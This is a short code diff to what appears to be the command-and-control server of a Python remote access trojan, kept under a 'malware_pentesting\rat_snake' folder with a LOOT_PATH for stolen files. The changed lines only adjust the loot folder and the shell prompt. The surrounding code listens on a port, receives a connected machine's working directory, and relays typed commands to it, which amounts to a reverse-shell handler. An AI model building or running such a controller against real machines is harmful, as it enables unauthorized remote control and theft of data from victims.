@@ -9,7 +9,7 @@ import socket
 HOST = "0.0.0.0"  # IP to listen on
 PORT = 1234  # port to listen on
 ENCODING = 'utf-8'
-LOOT_PATH = "C:\\Users\\minds\\Code\\malware_pentesting\\"
+LOOT_PATH = "C:\\Users\\minds\\Code\\malware_pentesting\\rat_snake\\"
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((HOST, PORT))
@@ -20,7 +20,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         client_working_directory = conn.recv(1024).decode(ENCODING)
         while True:
             # get command to run
-            command = input(f"{client_working_directory} $>")
+            command = input(f"{client_working_directory}$>")
             # send command
             command = command.encode(ENCODING)
             conn.sendall(command)
